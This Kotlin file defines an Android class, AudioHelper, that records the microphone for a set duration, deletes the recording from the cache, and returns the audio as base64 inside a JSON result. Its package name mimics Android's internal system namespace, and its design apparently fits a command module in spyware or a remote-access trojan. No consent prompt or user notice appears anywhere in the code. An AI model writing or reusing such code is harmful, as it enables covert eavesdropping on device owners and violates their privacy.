package com.android.internal.svc.modules

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import org.json.JSONObject
import java.io.File

class AudioHelper(private val context: Context) {

    fun record(durationSec: Int): JSONObject {
        val outFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.3gp")

        val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        return try {
            recorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(outFile.absolutePath)
                prepare()
                start()
            }

            Thread.sleep(durationSec * 1000L)
            recorder.stop()
            recorder.release()

            val bytes = outFile.readBytes()
            outFile.delete()

            JSONObject().apply {
                put("status", "recorded")
                put("duration", durationSec)
                put("size", bytes.size)
                put("data", Base64.encodeToString(bytes, Base64.NO_WRAP))
            }
        } catch (e: Exception) {
            recorder.release()
            outFile.delete()
            JSONObject().put("error", e.message)
        }
    }
}
